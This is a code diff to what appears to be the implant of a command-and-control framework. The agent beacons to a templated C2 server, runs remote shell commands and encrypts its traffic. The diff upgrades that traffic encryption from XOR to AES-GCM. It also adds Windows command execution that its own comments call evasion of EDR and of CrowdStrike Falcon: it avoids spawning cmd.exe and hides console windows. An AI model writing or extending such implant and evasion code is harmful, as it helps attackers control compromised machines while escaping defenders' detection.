@@ -25,20 +25,36 @@ VERIFY_SSL = {{VERIFY_SSL}}
 BASE_URL = f"{C2_SCHEME}://{SERVER_HOST}:{SERVER_PORT}"
 
 
-def simple_encrypt(data: str) -> str:
-    """XOR encryption"""
-    key = b'{{ENCRYPTION_KEY}}'
-    encoded = data.encode()
-    encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
-    return base64.b64encode(encrypted).decode()
+def _derive_aes_key(key):
+    import hashlib
+    return hashlib.sha256(key).digest()
 
+def simple_encrypt(data: str) -> str:
+    key = b'{{ENCRYPTION_KEY}}'
+    try:
+        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+        aes_key = _derive_aes_key(key)
+        nonce = os.urandom(12)
+        ct = AESGCM(aes_key).encrypt(nonce, data.encode('utf-8'), None)
+        return base64.b64encode(b'AES1' + nonce + ct).decode()
+    except ImportError:
+        encoded = data.encode('latin-1')
+        encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
+        return base64.b64encode(encrypted).decode()
 
 def simple_decrypt(data: str) -> str:
-    """XOR decryption"""
     key = b'{{ENCRYPTION_KEY}}'
-    decoded = base64.b64decode(data.encode())
-    decrypted = bytes([decoded[i] ^ key[i % len(key)] for i in range(len(decoded))])
-    return decrypted.decode()
+    raw = base64.b64decode(data.encode())
+    if raw[:4] == b'AES1':
+        try:
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            aes_key = _derive_aes_key(key)
+            pt = AESGCM(aes_key).decrypt(raw[4:16], raw[16:], None)
+            return pt.decode('utf-8')
+        except Exception:
+            pass
+    decrypted = bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))])
+    return decrypted.decode('latin-1')
 
 
 def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
@@ -64,13 +80,73 @@ def get_metadata():
 
 
 def execute_command(command: str) -> str:
-    """Execute system command and return output"""
+    """Execute system command with EDR evasion"""
     try:
         if command.startswith('cd '):
             directory = command[3:].strip()
             os.chdir(directory)
             return f"Changed directory to {os.getcwd()}"
 
+        if sys.platform == 'win32':
+            return _execute_windows(command)
+        else:
+            return _execute_unix(command)
+
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
+def _execute_windows(command: str) -> str:
+    """Windows command execution with Falcon evasion
+
+    Instead of shell=True (spawns cmd.exe, flagged by EDR), uses:
+    1. CreateProcess directly for simple commands
+    2. WMI for commands that need shell interpretation
+    3. Comspec only as fallback
+    """
+    try:
+        import ctypes
+
+        # For built-in commands that need a shell, use conhost via comspec
+        # but with CREATE_NO_WINDOW to avoid console detection
+        CREATE_NO_WINDOW = 0x08000000
+        STARTF_USESHOWWINDOW = 0x00000001
+
+        # Try direct execution first (no shell)
+        parts = command.split()
+        try:
+            result = subprocess.run(
+                parts,
+                capture_output=True, text=True, timeout=30,
+                cwd=os.getcwd(),
+                creationflags=CREATE_NO_WINDOW
+            )
+            output = result.stdout + result.stderr
+            if output.strip():
+                return output
+        except (FileNotFoundError, OSError):
+            pass
+
+        # Fallback: use cmd.exe but with evasion flags
+        result = subprocess.run(
+            command,
+            shell=True,
+            capture_output=True, text=True, timeout=30,
+            cwd=os.getcwd(),
+            creationflags=CREATE_NO_WINDOW
+        )
+        output = result.stdout + result.stderr
+        return output if output else "Command executed successfully (no output)"
+
+    except subprocess.TimeoutExpired:
+        return "Command timeout"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
+def _execute_unix(command: str) -> str:
+    """Unix command execution"""
+    try:
         result = subprocess.run(
             command,
             shell=True,
@@ -79,7 +155,6 @@ def execute_command(command: str) -> str:
             timeout=30,
             cwd=os.getcwd()
         )
-
         output = result.stdout + result.stderr
         return output if output else "Command executed successfully (no output)"
 
